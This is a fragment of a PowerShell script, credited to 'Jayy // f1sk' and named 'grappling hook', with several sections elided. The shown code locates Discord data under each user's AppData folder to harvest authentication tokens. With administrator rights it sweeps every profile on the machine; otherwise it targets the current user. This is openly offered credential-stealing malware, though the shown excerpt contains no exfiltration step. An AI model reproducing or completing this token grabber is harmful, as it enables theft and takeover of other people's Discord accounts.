# Rewritten as a info-gathering tool by Jayy // f1sk
# http://f1sk.xyz // http://jayy.xyz
# <3
$host.ui.RawUI.WindowTitle = "grappling hook"
if (Test-Path .\cool.txt) {
    Get-Content .\cool.txt | Write-Output
} else {
    exit
}
# Set / Reset varibles
...
function getTokensByUsername($username){
 $id=""
$tmpID=""
$user=""
$tmpTag=""
$discordPath = $username+"\AppData\Roaming"+"\discord"
...
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    ...
    getTokensByUsername($_.GetValue('ProfileImagePath'))
    }
} else {
    Write-Output "You are running without admin perms. So we can only access the current user."
    getTokensByUsername("C:\users\"+$env:UserName)
}
